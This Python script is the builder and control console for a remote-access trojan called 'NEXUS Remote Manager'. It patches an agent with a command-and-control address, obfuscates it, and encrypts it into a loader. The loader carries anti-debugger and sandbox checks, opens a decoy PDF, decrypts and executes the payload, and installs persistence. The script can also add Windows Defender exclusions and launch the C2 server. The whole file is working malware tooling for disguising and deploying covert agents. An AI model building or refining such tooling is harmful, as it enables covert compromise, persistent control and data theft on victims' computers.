#!/usr/bin/env python3
"""
NEXUS Remote Manager — Configure, build, and manage agents.
Enhanced with better error handling, navigation, and configuration.
"""

import os
import sys
import platform
import subprocess
import threading
import time
import socket
import shutil
import argparse
import json
import re
import base64
import zlib
from pathlib import Path

CONFIG_FILE = "manager_config.json"

DEFAULTS = {
    "server_ip": "127.0.0.1",
    "server_port": "8080",
    "stream_port": "",
    "output_name": "agent",
    "console": False,
    "uac_admin": False,
    "icon": "",
    "upx": False,
    "onefile": True,
    "use_pdf": True,
    "pdf_path": "decoy.pdf",
    "stealth": True,
}

import random as _random

SPEC_TEMPLATE = """# -*- mode: python ; coding: utf-8 -*-
a = Analysis(
    ['{client_file}'],
    pathex=[],
    binaries=[],
    datas={datas},
    hiddenimports=['pkg_resources'],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=['tkinter', 'tcl', 'tix', 'PIL.ImageTk', 'matplotlib', 'numpy', 'pandas',
              'scipy', 'sympy', 'notebook', 'jupyter', 'bokeh', 'plotly', 'dash',
              'unittest', 'pydoc', 'doctest', 'distutils', 'setuptools._distutils',
              'turtle', 'venv', 'ensurepip', 'email', 'mailcap',
              'http.server', 'cgi', 'cgitb', 'wsgiref', 'xmlrpc',
              'py_compile', 'compileall', 'filecmp', 'difflib',
              'sunau', 'wave', 'chunk', 'colorsys', 'imghdr', 'sndhdr',
              'json.tool', 'configparser', 'netrc', 'getpass', 'msilib',
              'antigravity', 'this', 'code', 'codeop', 'inspect', 'trace',
              'profile', 'pstats', 'cProfile', 'bdb', 'pdb', 'poplib', 'imaplib',
              'nntplib', 'telnetlib', 'quopri', 'mailcap', 'smtplib', 'ftplib',
              'asynchat', 'asyncore', 'multiprocessing', 'audioop', 'aifc',
              'audiodev', 'sunaudiodev'],
    noarchive=False,
    optimize=2,
)
pyz = PYZ(a.pure)
exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='{output_name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=True,
    upx={upx},
    upx_exclude=[],
    runtime_tmpdir=None,
    console={console},
    onefile={onefile},
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    {uac_line}
    {icon_line}
)
"""

ENCRYPTED_LOADER_TEMPLATE = """import sys, os, subprocess, base64, zlib, ctypes, ctypes.wintypes, time as _time

# Anti-debug: detect debugger, sandbox, VM
_u32 = ctypes.windll.kernel32
def _ad():
    try:
        if _u32.IsDebuggerPresent():
            sys.exit(0)
        h=ctypes.wintypes.HANDLE(-2)
        o=ctypes.c_ulong(0)
        if _u32.NtQueryInformationProcess(h,7,ctypes.byref(o),4,None)==0 and o.value:
            _time.sleep(10)
            sys.exit(0)
    except:
        pass
    try:
        total=0
        for c in ('C:\\\\','D:\\\\','E:\\\\'): total+=1 if os.path.exists(c) else 0
        if total<2: sys.exit(0)
    except:
        pass
_ad()

# Open embedded PDF decoy
try:
    pdf = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
    pdf = os.path.join(pdf, "{pdf_name}")
    if os.path.exists(pdf):
        if sys.platform == "win32":
            os.startfile(pdf)
        else:
            subprocess.Popen(["xdg-open", pdf])
except:
    pass

# Decrypt and execute encrypted client payload
_ek = bytes.fromhex("{enc_key}")
_ed = {enc_data}
try:
    _raw = bytes(_ed[i] ^ _ek[i % len(_ek)] ^ (i & 0xFF) for i in range(len(_ed)))
    _dec = zlib.decompress(_raw)
    exec(compile(_dec, '<string>', 'exec'), globals())
    enhanced_install_persistence()
    check_lock_state()
    import asyncio
    _loop = asyncio.new_event_loop()
    asyncio.set_event_loop(_loop)
    try:
        _loop.run_until_complete(main())
    finally:
        try:
            _loop.run_until_complete(_loop.shutdown_asyncgens())
        except:
            pass
        _loop.close()
except Exception as _ex:
    if os.environ.get("_DEBUG_"):
        import traceback; traceback.print_exc()
"""


def get_local_ips():
    """Get all local IP addresses."""
    ips = ["0.0.0.0", "127.0.0.1"]
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
            ip = info[4][0]
            if ip not in ips:
                ips.append(ip)
    except:
        pass
    return ips


class Manager:
    def __init__(self):
        self.config = dict(DEFAULTS)
        self._build_key = self._gen_key()
        self.load_config()

    def load_config(self):
        """Load configuration from file."""
        p = Path(CONFIG_FILE)
        if p.exists():
            try:
                with open(p) as f:
                    self.config.update(json.load(f))
                print(f"  [+] Loaded config from {CONFIG_FILE}")
            except Exception as e:
                print(f"  [!] Failed to load config: {e}")

    def save_config(self):
        """Save configuration to file."""
        try:
            with open(CONFIG_FILE, "w") as f:
                json.dump(self.config, f, indent=2)
            print("  [+] Config saved")
        except Exception as e:
            print(f"  [X] Failed to save config: {e}")

    def _generate_agent_keys(self, name):
        """Generate RSA-2048 keypair. Public key embedded in agent, private key stored on server."""
        try:
            from Crypto.PublicKey import RSA
        except ImportError:
            print("  [!] Installing pycryptodome...")
            subprocess.run([sys.executable, "-m", "pip", "install", "pycryptodome"], 
                          capture_output=True)
            from Crypto.PublicKey import RSA
            
        key_dir = os.path.join(os.getcwd(), "keys", name)
        os.makedirs(key_dir, exist_ok=True)
        key = RSA.generate(2048)
        priv = key.export_key().decode()
        pub = key.publickey().export_key().decode()
        
        with open(os.path.join(key_dir, "private.pem"), "w") as f:
            f.write(priv)
        with open(os.path.join(key_dir, "public.pem"), "w") as f:
            f.write(pub)
            
        print(f"  [+] Generated RSA-2048 keypair for '{name}' -> keys/{name}/")
        return pub

    def patch_client(self):
        """Patch client.py with configuration values."""
        if not Path("client.py").exists():
            print("  [X] client.py not found!")
            return False
            
        src = Path("client.py").read_text(encoding="utf-8")
        name = self.config["output_name"]
        
        src = re.sub(
            r'SERVER_IP = os\.environ\.get\("SERVER_IP", "[^"]*"\)',
            f'SERVER_IP = os.environ.get("SERVER_IP", "{self.config["server_ip"]}")',
            src,
        )
        src = re.sub(
            r'SERVER_PORT = int\(os\.environ\.get\("SERVER_PORT", os\.environ\.get\("PORT", "[^"]*"\)\)\)',
            f'SERVER_PORT = int(os.environ.get("SERVER_PORT", os.environ.get("PORT", "{self.config["server_port"]}")))',
            src,
        )
        if self.config.get("stream_port"):
            src = re.sub(
                r'_STREAM_UDP_PORT = .+',
                f'_STREAM_UDP_PORT = {self.config["stream_port"]}',
                src,
            )
            
        pubkey = self._generate_agent_keys(name)
        src = re.sub(r'_EMBEDDED_PUBKEY = .+', lambda m: f'_EMBEDDED_PUBKEY = {json.dumps(pubkey)}', src)
        src = re.sub(r'_AGENT_NAME = .+', lambda m: f'_AGENT_NAME = {json.dumps(name)}', src)
        
        Path("client.py").write_text(src, encoding="utf-8")
        print(f"  [+] Patched client.py -> {self.config['server_ip']}:{self.config['server_port']}")
        if self.config.get("stream_port"):
            print(f"  [+] Stream UDP port -> {self.config['stream_port']}")
        print(f"  [+] Embedded pubkey for '{name}'")
        return True

    def generate_spec(self, entry_point="client.py"):
        """Generate PyInstaller spec file."""
        datas = []
        pdf_name = ""
        if self.config.get("use_pdf") and self.config.get("pdf_path"):
            pdf = self.config["pdf_path"]
            if os.path.exists(pdf):
                datas.append((pdf, "."))
                pdf_name = os.path.basename(pdf)
        datas_str = repr(datas)

        uac_line = ""
        if self.config["uac_admin"]:
            uac_line = "uac_admin=True,"
        icon_line = ""
        if self.config["icon"] and os.path.exists(self.config["icon"]):
            icon_line = f"icon=[r'{self.config['icon']}'],"

        spec = SPEC_TEMPLATE.format(
            client_file=entry_point,
            output_name=self.config["output_name"],
            datas=datas_str,
            upx=str(self.config["upx"]),
            console=str(self.config["console"]),
            onefile=str(self.config["onefile"]),
            uac_line=uac_line,
            icon_line=icon_line,
        )
        spec_file = f"build_{self.config['output_name']}.spec"
        Path(spec_file).write_text(spec)
        print(f"  [+] Generated {spec_file}")
        return spec_file

    def _gen_key(self):
        """Generate random encryption key."""
        return bytes(_random.randrange(256) for _ in range(16))

    def _inject_key(self, src):
        """Inject encryption key into source."""
        key_str = self._build_key.hex()
        src = src.replace('b"OBFUSCATION_KEY_16BYTE"', f'bytes.fromhex("{key_str}")')
        return src

    def _gen_fn_name(self):
        """Generate random function name."""
        import string
        letters = string.ascii_lowercase
        chars = 8 + _random.randrange(4)
        name = "_" + "".join(_random.choice(letters) for _ in range(chars))
        return name

    def _obfuscate_client(self):
        """Apply obfuscation to client code."""
        if not self.config.get("stealth"):
            return

        self._build_key = self._gen_key()
        src = Path("client.py").read_text("utf-8")
        src = self._inject_key(src)
        fn_repl = self._gen_fn_name()

        # Rename obfuscation functions
        for old_name in ('_s', '_sb', '_obf', '_obf_b'):
            pat_def = rf'def\s+{re.escape(old_name)}\s*\('
            pat_call = rf'{re.escape(old_name)}\s*\('
            if re.search(pat_def, src):
                src = re.sub(pat_def, f'def {fn_repl}(', src)
                src = re.sub(pat_call, f'{fn_repl}(', src)
                break

        # Obfuscate imports
        import_obf_targets = [
            'os', 'sys', 'json', 'base64', 'time', 'random',
            'socket', 'struct', 'threading', 'subprocess',
        ]
        for mod in import_obf_targets:
            src = re.sub(
                rf'^import\s+{re.escape(mod)}\s+as\s+(\w+)\s*$',
                rf'\\1 = __import__("{mod}")',
                src, flags=re.MULTILINE
            )
            src = re.sub(
                rf'^import\s+{re.escape(mod)}\s*$',
                rf'{mod} = __import__("{mod}")',
                src, flags=re.MULTILINE
            )
            src = re.sub(
                rf'^from\s+{re.escape(mod)}\s+import\s+(\w+)\s*$',
                rf'\\1 = __import__("{mod}").\\1',
                src, flags=re.MULTILINE
            )

        # Inject dead code
        dead_code_id = f'_dc{_random.randrange(1000,9999)}'
        dead_code_snippets = [
            f'{dead_code_id}=sum((i*7)&0xFF for i in range(8))',
            f'{dead_code_id}=((42^13)&0xFF)',
        ]
        dead_lines = []
        for line in src.split('\n'):
            dead_lines.append(line)
            stripped = line.strip()
            if stripped.startswith('def ') and stripped.endswith(':'):
                snippet = _random.choice(dead_code_snippets)
                base_indent = len(line) - len(line.lstrip())
                indent = ' ' * (base_indent + 4)
                dead_lines.append(f'{indent}{snippet}')
        src = '\n'.join(dead_lines)

        Path("client.py").write_text(src, "utf-8")
        print(f"  [+] Obfuscated: imports obfuscated, dead code injected")
        print(f"  [+] Obfuscation fn: {fn_repl}, key: {self._build_key.hex()[:8]}...")

    def _find_pyinstaller(self):
        """Find PyInstaller executable."""
        candidates = ["pyinstaller", "pyinstaller3"]
        for c in candidates:
            if shutil.which(c):
                return [c]
        try:
            result = subprocess.run(
                [sys.executable, "-m", "PyInstaller", "--version"],
                capture_output=True, timeout=10,
            )
            if result.returncode == 0:
                return [sys.executable, "-m", "PyInstaller"]
        except:
            pass
        return None

    def _add_defender_exclusion(self, paths):
        """Add Windows Defender exclusion for build directories (optional, with error handling)."""
        if platform.system() != "Windows":
            return
            
        # Check admin rights
        try:
            import ctypes
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if not is_admin:
                print("  [!] Defender exclusion requires admin rights - skipping")
                return
        except:
            print("  [!] Cannot check admin rights - skipping Defender exclusion")
            return
        
        for p in paths:
            try:
                os.makedirs(p, exist_ok=True)
                # Use shorter timeout and better error handling
                result = subprocess.run(
                    ["powershell", "-Command", 
                     f"Add-MpPreference -ExclusionPath '{p}' -ErrorAction SilentlyContinue"],
                    capture_output=True, 
                    timeout=5,
                    shell=False
                )
                if result.returncode == 0:
                    print(f"  [+] Added Defender exclusion: {p}")
            except subprocess.TimeoutExpired:
                print(f"  [!] Timeout adding exclusion for {p} - skipping")
            except Exception as e:
                print(f"  [!] Could not add exclusion for {p}: {e}")

    def _encrypt_client_blob(self, src_path):
        """Read client.py, encrypt it into an XOR+base64 blob for the encrypted loader."""
        raw = Path(src_path).read_bytes()
        compressed = zlib.compress(raw, 9)
        ek = self._gen_key()
        enc = bytes(compressed[i] ^ ek[i % len(ek)] ^ (i & 0xFF) for i in range(len(compressed)))
        enc_list = list(enc)
        return ek.hex(), enc_list

    def build_agent(self):
        """Build the agent executable."""
        print("\n" + "="*50)
        print("--- Building Standalone Agent ---")
        print("="*50)
        
        # Check if client.py exists
        if not Path("client.py").exists():
            print("  [X] client.py not found! Make sure you're in the correct directory.")
            return
        
        # Restore clean client.py if git available
        try:
            subprocess.run(["git", "checkout", "client.py"], 
                          capture_output=True, timeout=5)
        except:
            print("  [!] Git not available - skipping client.py restore")
        
        if not self.patch_client():
            return
            
        self._obfuscate_client()

        use_pdf = self.config.get("use_pdf") and self.config.get("pdf_path") and os.path.exists(self.config["pdf_path"])
        pdf_name = os.path.basename(self.config["pdf_path"]) if use_pdf else ""

        # Build encrypted loader
        print("  [+] Creating encrypted loader...")
        enc_key, enc_data = self._encrypt_client_blob("client.py")
        loader = ENCRYPTED_LOADER_TEMPLATE.format(
            pdf_name=pdf_name,
            enc_key=enc_key,
            enc_data=repr(enc_data),
        )
        Path("client_loader.py").write_text(loader)
        
        if use_pdf:
            print(f"  [+] Created client_loader.py (PDF: {pdf_name})")
        else:
            print(f"  [+] Created client_loader.py (encrypted payload)")
        
        entry = "client_loader.py"
        spec = self.generate_spec(entry_point=entry)

        # Check PyInstaller
        pyinst = self._find_pyinstaller()
        if not pyinst:
            print("  [X] PyInstaller not found!")
            print("  [!] Installing PyInstaller...")
            result = subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"],
                                   capture_output=True)
            if result.returncode != 0:
                print("  [X] Failed to install PyInstaller. Please install manually:")
                print("      pip install pyinstaller")
                return
            pyinst = self._find_pyinstaller()
            if not pyinst:
                print("  [X] PyInstaller still not found. Please install manually.")
                return

        # Optional: Add Defender exclusion (non-critical)
        print("  [+] Preparing build directories...")
        build_dir = os.path.join(os.getcwd(), "build")
        dist_dir = os.path.join(os.getcwd(), "dist")
        os.makedirs(build_dir, exist_ok=True)
        os.makedirs(dist_dir, exist_ok=True)
        
        print("  [+] Running PyInstaller (this may take a few minutes)...")
        cmd = pyinst + ["--noconfirm", spec]

        try:
            result = subprocess.run(cmd, capture_output=True, timeout=1200, text=True)
        except subprocess.TimeoutExpired:
            print("  [X] Build timed out after 1200 seconds (20 minutes).")
            print("  [!] Possible causes:")
            print("      1. Windows Defender real-time scanning (disable temporarily)")
            print("      2. Low system memory")
            print("      3. Missing dependencies")
            print(f"  [!] Try running manually: {' '.join(cmd)}")
            return
        except Exception as e:
            print(f"  [X] Build failed with error: {e}")
            return

        if result.returncode == 0:
            ext = ".exe" if platform.system() == "Windows" else ""
            exe_path = os.path.join("dist", self.config["output_name"] + ext)
            if os.path.exists(exe_path):
                size = os.path.getsize(exe_path) / 1024 / 1024
                print(f"  [✓] Build SUCCESSFUL!")
                print(f"  [✓] Output: {exe_path} ({size:.1f} MB)")
            else:
                print("  [!] Build reported success but executable not found in dist/")
                print(f"  [!] Looking for: {exe_path}")
        else:
            print("  [X] Build FAILED!")
            if result.stderr:
                print("\n  Error output:")
                print("-"*40)
                print(result.stderr[-2000:])
                print("-"*40)
            if result.stdout:
                print("\n  Standard output (last 1000 chars):")
                print("-"*40)
                print(result.stdout[-1000:])
                print("-"*40)

    def _ensure_deps(self, packages):
        """Ensure required packages are installed."""
        missing = []
        for pkg in packages:
            try:
                __import__(pkg)
            except ImportError:
                missing.append(pkg)
        if not missing:
            return True
        print(f"  [!] Missing server deps: {', '.join(missing)}")
        ans = input("  Install now? [Y/n]: ").strip().lower()
        if ans == "n":
            return False
        for pkg in missing:
            pip_name = "pycryptodome" if pkg == "cryptography" else pkg
            print(f"  Installing {pip_name}...")
            r = subprocess.run(
                [sys.executable, "-m", "pip", "install", pip_name],
                capture_output=True, timeout=120,
            )
            if r.returncode != 0:
                print(f"  [X] Failed to install {pip_name}")
                return False
        print("  [+] Dependencies installed")
        return True

    def start_server(self, ip=None, port=None):
        """Start the C2 server."""
        print("\n" + "="*50)
        print("--- Starting Server ---")
        print("="*50)
        ip = ip or self.config["server_ip"]
        port = port or self.config["server_port"]
        
        if not self._ensure_deps(["fastapi", "uvicorn", "websockets"]):
            return
            
        self._kill_port(port)
        
        if not Path("server.py").exists():
            print("  [X] server.py not found!")
            return
            
        env = {**os.environ, "HOST": ip, "PORT": str(port)}
        try:
            p = subprocess.Popen(
                [sys.executable, "server.py"], env=env,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
            )
            time.sleep(3)
            if p.poll() is None:
                print(f"  [+] Server running on http://{ip}:{port}")
                print(f"  [+] WebSocket endpoint: ws://{ip}:{port}/ws/client")
                print("  [+] Press Ctrl+C to stop the server when done")
                try:
                    p.wait()
                except KeyboardInterrupt:
                    print("\n  [!] Stopping server...")
                    p.terminate()
            else:
                _, err = p.communicate()
                print(f"  [X] Server failed to start: {err.strip()[:500]}")
        except Exception as e:
            print(f"  [X] Failed to start server: {e}")

    def stop_server(self):
        """Stop the C2 server."""
        print("\n--- Stopping Server ---")
        self._kill_port(self.config["server_port"])
        print("  [+] Done")

    def _kill_port(self, port):
        """Kill process using specified port."""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    f'netstat -ano | findstr :{port} | findstr LISTENING',
                    shell=True, capture_output=True, text=True, timeout=5
                )
                for line in result.stdout.strip().split("\n"):
                    if line:
                        parts = line.split()
                        if parts and parts[-1].isdigit():
                            pid = parts[-1]
                            subprocess.run(["taskkill", "/F", "/PID", pid],
                                         capture_output=True, timeout=5)
            else:
                result = subprocess.run(["lsof", "-ti", f":{port}"], 
                                      capture_output=True, text=True, timeout=5)
                for pid in result.stdout.strip().split("\n"):
                    if pid:
                        subprocess.run(["kill", "-9", pid])
        except:
            pass

    def show_menu(self):
        """Display main menu."""
        os.system("cls" if os.name == "nt" else "clear")
        c = self.config
        print("="*60)
        print("           NEXUS Remote Manager v2.0")
        print("="*60)
        print("\n[ Configuration ]")
        print("-"*40)
        
        menu_items = [
            ("1", "Server IP", c["server_ip"]),
            ("2", "Server Port (HTTP)", c["server_port"]),
            ("P", "Stream UDP Port", c["stream_port"] or "(auto)"),
            ("3", "Output exe name", c["output_name"]),
            ("4", "Console window", "Yes" if c["console"] else "No"),
            ("5", "UAC Admin", "Yes" if c["uac_admin"] else "No"),
            ("6", "Icon file", os.path.basename(c["icon"]) if c["icon"] else "(none)"),
            ("7", "UPX compress", "Yes" if c["upx"] else "No"),
            ("8", "Single file", "Yes" if c["onefile"] else "No"),
            ("9", "PDF decoy", "Yes" if c["use_pdf"] else "No"),
            ("0", "Stealth obfuscation", "Yes" if c["stealth"] else "No"),
        ]
        
        for key, label, value in menu_items:
            print(f"  [{key}] {label:<20} {value}")
        
        print("\n[ Actions ]")
        print("-"*40)
        print("  [S] Start Server     [T] Stop Server")
        print("  [B] Build Agent      [C] Show Full Config")
        print("  [R] Reset to Defaults")
        print("  [Q] Quit")
        print("\n" + "="*60)
        
        return input("  Choice: ").strip().lower()

    def edit(self, prompt, current=""):
        """Get user input with default value."""
        v = input(f"  {prompt} [{current}]: ").strip()
        return v if v else current

    def _pick_interface(self):
        """Let user pick network interface."""
        ips = get_local_ips()
        print("\n  Available network interfaces:")
        for i, ip in enumerate(ips):
            mark = " ✓ (current)" if ip == self.config["server_ip"] else ""
            print(f"    [{i}] {ip}{mark}")
        print(f"    [C] Custom IP")
        print(f"    [Enter] Keep current ({self.config['server_ip']})")
        ch = input("  Choose interface: ").strip().lower()
        if ch == "c":
            return input("  Enter custom IP: ").strip() or self.config["server_ip"]
        if ch.isdigit() and int(ch) < len(ips):
            return ips[int(ch)]
        return self.config["server_ip"]
    
    def reset_config(self):
        """Reset configuration to defaults."""
        print("\n  Resetting to default configuration...")
        self.config = dict(DEFAULTS)
        self.save_config()
        print("  [+] Configuration reset to defaults")

    def show_full_config(self):
        """Display full configuration."""
        print("\n" + "="*50)
        print("  Full Configuration")
        print("="*50)
        for key, value in self.config.items():
            if key == "icon" and value:
                print(f"  {key:<20} {value}")
            elif key == "pdf_path" and value:
                print(f"  {key:<20} {value}")
            else:
                print(f"  {key:<20} {value}")
        print("="*50)

    def run(self):
        """Main application loop."""
        print("\n  [+] NEXUS Remote Manager initialized")
        print("  [+] Type 'help' at any menu for assistance")
        time.sleep(1)
        
        while True:
            ch = self.show_menu()
            c = self.config
            
            # Configuration options
            if ch == "1":
                c["server_ip"] = self.edit("Server IP", c["server_ip"])
                self.save_config()
            elif ch == "2":
                c["server_port"] = self.edit("Port", c["server_port"])
                self.save_config()
            elif ch == "p":
                v = input(f"  Stream UDP port [{c['stream_port'] or 'auto'}]: ").strip()
                c["stream_port"] = v
                self.save_config()
            elif ch == "3":
                c["output_name"] = self.edit("Output name", c["output_name"])
                self.save_config()
            elif ch == "4":
                c["console"] = not c["console"]
                print(f"  Console window: {'Yes' if c['console'] else 'No'}")
                self.save_config()
            elif ch == "5":
                c["uac_admin"] = not c["uac_admin"]
                print(f"  UAC Admin: {'Yes' if c['uac_admin'] else 'No'}")
                self.save_config()
            elif ch == "6":
                v = input(f"  Icon path [{c['icon'] or 'none'}]: ").strip()
                if v:
                    if os.path.exists(v) and v.endswith('.ico'):
                        c["icon"] = v
                        print(f"  [+] Icon set to {v}")
                    else:
                        print("  [!] File not found or not a .ico file")
                else:
                    c["icon"] = ""
                    print("  [+] Icon removed")
                self.save_config()
            elif ch == "7":
                c["upx"] = not c["upx"]
                print(f"  UPX compress: {'Yes' if c['upx'] else 'No'}")
                self.save_config()
            elif ch == "8":
                c["onefile"] = not c["onefile"]
                print(f"  Single file: {'Yes' if c['onefile'] else 'No'}")
                self.save_config()
            elif ch == "9":
                c["use_pdf"] = not c["use_pdf"]
                if c["use_pdf"]:
                    v = input(f"  PDF path [{c['pdf_path'] or 'none'}]: ").strip()
                    if v:
                        if os.path.exists(v) and v.endswith('.pdf'):
                            c["pdf_path"] = v
                            print(f"  [+] PDF decoy set to {v}")
                        else:
                            print("  [!] File not found or not a PDF")
                            c["use_pdf"] = False
                    elif not c["pdf_path"]:
                        print("  [!] No PDF specified, disabling PDF decoy")
                        c["use_pdf"] = False
                else:
                    print("  PDF decoy: Disabled")
                self.save_config()
            elif ch == "0":
                c["stealth"] = not c["stealth"]
                print(f"  Stealth obfuscation: {'Yes' if c['stealth'] else 'No'}")
                self.save_config()
            
            # Actions
            elif ch == "s":
                self.save_config()
                ip = self._pick_interface()
                port = input(f"  Port [{self.config['server_port']}]: ").strip() or self.config["server_port"]
                self.config["server_ip"] = ip
                self.config["server_port"] = port
                self.save_config()
                self.start_server(ip=ip, port=port)
                input("\n  Press Enter to continue...")
            elif ch == "t":
                self.stop_server()
                input("\n  Press Enter to continue...")
            elif ch == "b":
                self.save_config()
                self.build_agent()
                input("\n  Press Enter to continue...")
            elif ch == "c":
                self.show_full_config()
                input("\n  Press Enter to continue...")
            elif ch == "r":
                confirm = input("  Reset all configuration to defaults? (y/N): ").lower()
                if confirm == 'y':
                    self.reset_config()
                input("\n  Press Enter to continue...")
            elif ch == "q":
                self.save_config()
                print("\n  [+] Shutting down...")
                print("  [+] Goodbye!")
                break
            elif ch == "help":
                print("\n  NEXUS Remote Manager Help")
                print("  " + "="*30)
                print("  Configuration:")
                print("    1-0 - Toggle configuration options")
                print("    P   - Set UDP stream port")
                print("\n  Actions:")
                print("    S   - Start C2 server")
                print("    T   - Stop C2 server")
                print("    B   - Build agent executable")
                print("    C   - Show full configuration")
                print("    R   - Reset to defaults")
                print("    Q   - Quit application")
                input("\n  Press Enter to continue...")
            else:
                print(f"  [!] Unknown option: {ch}")
                time.sleep(1)


def main():
    parser = argparse.ArgumentParser(description="NEXUS Remote Manager")
    parser.add_argument("--build", metavar="IP:PORT", help="Build agent for IP:PORT and exit")
    parser.add_argument("--name", default="agent", help="Output exe name (with --build)")
    parser.add_argument("--console", action="store_true", help="Show console window")
    parser.add_argument("--uac", action="store_true", help="Request UAC admin")
    parser.add_argument("--icon", help="Icon .ico file")
    parser.add_argument("--stealth", action="store_true", help="Enable string obfuscation")
    parser.add_argument("--no-stealth", action="store_true", help="Disable string obfuscation")
    parser.add_argument("--stream-port", help="UDP stream port")
    args = parser.parse_args()

    m = Manager()
    
    if args.no_stealth:
        m.config["stealth"] = False
    if args.stealth:
        m.config["stealth"] = True
    if args.stream_port:
        m.config["stream_port"] = args.stream_port
        
    if args.build:
        if ":" in args.build:
            ip, port = args.build.split(":", 1)
            m.config["server_ip"] = ip
            m.config["server_port"] = port
        else:
            m.config["server_ip"] = args.build
        m.config["output_name"] = args.name
        m.config["console"] = args.console
        m.config["uac_admin"] = args.uac
        if args.icon:
            m.config["icon"] = args.icon
        m.build_agent()
    else:
        try:
            m.run()
        except KeyboardInterrupt:
            print("\n\n  [!] Interrupted by user")
            m.save_config()
            print("  [+] Configuration saved. Goodbye!")


if __name__ == "__main__":
    main()
